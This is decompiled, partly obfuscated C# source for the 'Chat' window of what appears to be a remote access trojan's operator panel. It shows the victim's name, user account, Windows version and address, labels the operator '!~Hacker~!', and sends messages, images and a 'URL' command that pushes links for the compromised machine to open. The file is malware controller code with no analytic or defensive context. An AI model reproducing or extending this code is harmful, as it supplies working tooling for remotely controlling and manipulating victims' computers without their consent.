		SqlabC_ControlMini1.Location = new Point(772, 2);
		SqlabC_ControlMini1.Name = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.Size = new Size(18, 18);
		SqlabC_ControlMini1.TabIndex = 133;
		SqlabC_ControlMini1.Text = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.TextColor = Color.FromArgb(243, 243, 243);
		base.AutoScaleDimensions = new SizeF(6f, 13f);
		base.AutoScaleMode = AutoScaleMode.Font;
		BackColor = Color.FromArgb(24, 30, 54);
		base.ClientSize = new Size(841, 476);
		base.Controls.Add(SqlabC_ControlMini1);
		base.Controls.Add(panel5);
		base.Controls.Add(ZZZ);
		base.Controls.Add(PictureBox6);
		base.Controls.Add(Button3);
		base.Controls.Add(Button1);
		base.Controls.Add(Namees);
		base.Controls.Add(PictureBox3);
		base.Controls.Add(panel1);
		base.Controls.Add(Guna2ControlBox1);
		base.Controls.Add(T2);
		base.Controls.Add(T1);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Name = "Chat";
		base.StartPosition = FormStartPosition.CenterScreen;
		Text = "Chat";
		panel1.ResumeLayout(performLayout: false);
		((ISupportInitialize)PictureBox4).EndInit();
		Panel3.ResumeLayout(performLayout: false);
		Panel3.PerformLayout();
		((ISupportInitialize)PictureBox8).EndInit();
		((ISupportInitialize)PictureBox2).EndInit();
		panel2.ResumeLayout(performLayout: false);
		((ISupportInitialize)PictureBox10).EndInit();
		((ISupportInitialize)PictureBox9).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)PictureBox3).EndInit();
		((ISupportInitialize)PictureBox6).EndInit();
		panel5.ResumeLayout(performLayout: false);
		panel5.PerformLayout();
		((ISupportInitialize)PictureBox5).EndInit();
		ResumeLayout(performLayout: false);
		PerformLayout();
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer zcwrgQyIonF()
	{
		return timer_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_0(Timer WithEventsValue)
	{
		EventHandler value = method_2;
		Timer timer = timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		timer_0 = WithEventsValue;
		timer = timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2AnimateWindow vmethod_1()
	{
		return guna2AnimateWindow_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_2(Guna2AnimateWindow WithEventsValue)
	{
		guna2AnimateWindow_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2BorderlessForm vmethod_3()
	{
		return guna2BorderlessForm_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_4(Guna2BorderlessForm WithEventsValue)
	{
		guna2BorderlessForm_0 = WithEventsValue;
	}

	public string ImageToBase64(Image Img, ImageFormat format)
	{
		using MemoryStream memoryStream = new MemoryStream();
		Img.Save(memoryStream, format);
		return Convert.ToBase64String(memoryStream.ToArray());
	}

	public Image Base64ToImage(string Base64String)
	{
		byte[] array = Convert.FromBase64String(Base64String);
		MemoryStream memoryStream = new MemoryStream(array, 0, array.Length);
		memoryStream.Write(array, 0, array.Length);
		return Image.FromStream(memoryStream, useEmbeddedColorManagement: true);
	}

	public Chat()
	{
		base.FormClosing += Chat_FormClosing;
		base.Load += Chat_Load;
		string_3 = "Taypeing now";
		hk = "!~Hacker~!";
		method_0();
	}

	public void Chat_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (sk.CN)
		{
			sk.Send("@");
		}
		sk.CN = false;
	}

	public void Chat_Load(object sender, EventArgs e)
	{
		string expression = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.gsciXiVbtJ(osk.L)));
		string[] array = Strings.Split(expression, "|'|");
		Namevctim.Text = array[1];
		UserNameFCToolStripMenuItem.Text = array[2];
		WindowsWindows10ToolStripMenuItem.Text = array[3];
		ADD.Text = array[4];
		string_0 = array[1];
		Show();
	}

	public void method_1(object sender, KeyEventArgs e)
	{
		if (e.KeyCode != Keys.Return)
		{
			T2.Select();
			return;
		}
		e.SuppressKeyPress = true;
		if (Operators.CompareString(T2.Text, string.Empty, TextCompare: false) == 0)
		{
			return;
		}
		lock (this)
		{
			T1.SelectionStart = T1.TextLength;
			T1.SelectionFont = new Font(T1.Font, FontStyle.Bold);
			T1.AppendText(Class6.smethod_5() + " [" + hk + "] ");
			T1.SelectionFont = T1.Font;
			T1.AppendText(T2.Text + "\r\n");
			T1.SelectionStart = T1.TextLength;
			T1.ScrollToCaret();
			TextBox t = T2;
			string text2 = (t.Text = t.Text);
			sk.Send("!" + Class7.string_1 + Class6.smethod_7(ref text2));
			T2.Text = string.Empty;
		}
	}

	public void method_2(object sender, EventArgs e)
	{
		if ((sk == null) | (osk == null))
		{
			if (T2.Enabled | (Operators.CompareString(T1.Text, string.Empty, TextCompare: false) == 0))
			{
				T1.AppendText("Disconnected ...");
			}
			T2.Enabled = false;
			sk.Send("@");
			sk.CN = false;
			Close();
		}
		else if (!sk.CN | !osk.CN)
		{
			if (T2.Enabled | (Operators.CompareString(T1.Text, string.Empty, TextCompare: false) == 0))
			{
				T1.AppendText("Disconnected ...");
			}
			T2.Enabled = false;
			sk.Send("@");
			sk.CN = false;
			Close();
		}
	}

	public void method_3(object sender, LinkClickedEventArgs e)
	{
		try
		{
			Process.Start(e.LinkText);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_4(object sender, EventArgs e)
	{
		if (Operators.CompareString(Namees.Text, null, TextCompare: false) == 0)
		{
			Namees.Text = "Hackerz";
		}
		if (Operators.CompareString(string_1, string.Empty, TextCompare: false) != 0)
		{
			string left = Namees.Text;
			if (Operators.CompareString(left, string.Empty, TextCompare: false) == 0)
			{
				sk.CN = false;
			}
			else
			{
				hk = left;
				sk.Send("~" + Class7.string_1 + Class6.smethod_7(ref hk) + Class7.string_1 + string_1);
				Hackname.Text = left;
				PictureBox3.Hide();
				PictureBox4.Hide();
				PictureBox8.Hide();
				PictureBox9.Hide();
				PictureBox6.Hide();
				Button1.Hide();
				Button3.Hide();
				Namees.Hide();
				ZZZ.Hide();
			}
			zcwrgQyIonF().Enabled = true;
			T2.Select();
			T2.Focus();
		}
		else
		{
			Interaction.MsgBox("Enter your Image !!", MsgBoxStyle.Exclamation, "Error !!");
		}
	}

	public Image ResizeImage(Image Img, Size NewSize)
	{
		Bitmap bitmap = new Bitmap(NewSize.Width, NewSize.Height);
		Graphics graphics = Graphics.FromImage(bitmap);
		graphics.DrawImage(Img, 0, 0, NewSize.Width, NewSize.Height);
		return bitmap;
	}

	public void method_5(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "Image files (*.jpg, *.jpeg, *.gif, *.bmp, *.png) | *.jpg; *.jpeg; *.gif; *.bmp; *.png";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			Bitmap img = (Bitmap)ResizeImage(Image.FromFile(openFileDialog.FileName), new Size(250, 250));
			string text = ImageToBase64(img, ImageFormat.Jpeg);
			string text2 = text;
			string_1 = text2;
			PictureBox6.Image = Image.FromFile(openFileDialog.FileName);
			PictureBox2.Image = Image.FromFile(openFileDialog.FileName);
		}
	}

	public void method_6(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "Image files (*.jpg, *.jpeg, *.gif, *.bmp, *.png) | *.jpg; *.jpeg; *.gif; *.bmp; *.png";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			Bitmap img = (Bitmap)ResizeImage(Image.FromFile(openFileDialog.FileName), new Size(250, 250));
			string text = ImageToBase64(img, ImageFormat.Jpeg);
			string text2 = text;
			Class7.string_2 = text2;
			PictureBox2.Image = Image.FromFile(openFileDialog.FileName);
		}
		sk.Send("zz" + Class7.string_1 + Class7.string_2);
	}

	public void method_7(object sender, EventArgs e)
	{
	}

	public void method_8(object sender, EventArgs e)
	{
		try
		{
			string text = Interaction.InputBox("Enter Your Lnk", "Open Lnk", hk);
			if (Operators.CompareString(text, string.Empty, TextCompare: false) != 0)
			{
				sk.Send("URL" + Class7.string_1 + text);
			}
			else
			{
				Interaction.MsgBox("Enter your Lnk !!", MsgBoxStyle.Exclamation, "Error !!");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_9(object sender, EventArgs e)
	{
		if (sk.CN)
		{
			sk.Send("@");
		}
		sk.CN = false;
		Close();
	}

	public void method_10(object sender, EventArgs e)
	{
		if (sk.CN)
		{
			sk.Send("@");
		}
		sk.CN = false;
		Close();
	}

	public void method_11(object sender, EventArgs e)
	{
	}

	public void method_12(object sender, EventArgs e)
	{
		Hide();
	}
}
